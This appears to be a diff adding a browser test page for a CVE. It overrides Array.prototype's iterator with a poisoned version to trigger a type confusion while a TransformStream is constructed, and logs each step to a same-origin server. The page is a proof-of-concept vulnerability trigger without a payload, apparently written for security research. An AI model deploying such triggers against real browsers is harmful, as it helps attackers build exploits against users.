@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CVE Step Test</title>
+</head>
+<body>
+<script>
+// Send results to our server so we can track even if page crashes
+function report(msg) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('GET', '/log?m=' + encodeURIComponent(msg), false);
+        x.send();
+    } catch(e) {}
+}
+
+report('START: page loaded');
+
+// Step 1: minimal test
+try {
+    report('STEP1: creating normal TransformStream');
+    var ts = new TransformStream();
+    report('STEP1: OK - normal TransformStream created');
+    ts = null;
+} catch(e) {
+    report('STEP1: EXCEPTION - ' + e.constructor.name + ': ' + e.message);
+}
+
+// Step 2: poisoned iterator
+var orig = Array.prototype[Symbol.iterator];
+try {
+    report('STEP2: setting poisoned iterator');
+    Array.prototype[Symbol.iterator] = function() {
+        var a = this, i = 0;
+        return { next: function() {
+            if (i >= a.length) return {done:true};
+            var v = a[i];
+            if (a.length === 3 && i >= 1) v = {fake:true};
+            i++;
+            return {value:v, done:false};
+        }};
+    };
+    report('STEP2: iterator poisoned, creating TransformStream');
+    var ts2 = new TransformStream();
+    report('STEP2: OK - survived type confusion');
+} catch(e) {
+    report('STEP2: EXCEPTION - ' + e.constructor.name + ': ' + e.message);
+}
+Array.prototype[Symbol.iterator] = orig;
+
+report('END: all steps done');
+document.write('DONE - check server logs');
+</script>
+</body>
+</html>
